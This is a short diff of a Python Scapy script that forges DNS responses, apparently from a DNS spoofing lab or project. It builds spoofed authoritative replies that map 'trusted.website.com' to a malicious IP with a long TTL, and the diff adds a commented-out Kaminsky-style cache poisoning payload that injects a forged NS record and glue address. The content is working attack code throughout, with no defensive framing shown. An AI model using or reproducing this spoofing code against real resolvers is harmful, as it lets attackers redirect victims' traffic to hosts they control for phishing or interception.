@@ -10,9 +10,15 @@ src_port=53
 dst_port=6666
 
 website='trusted.website.com'
+dnswebsite='dnswebsite.website.com'
 
 #precompute standard object
 response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))
+
+#kaminsky
+#response=(IP(dst=src_ip, src=dst_ip)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=604769, rdata=dnswebsite), ar=DNSRR(rrname=dnswebsite, type='A', ttl=604769, rdata="192.168.0.150")))
+
+
 dns_layer = response[DNS]
 
 s = conf.L3socket()
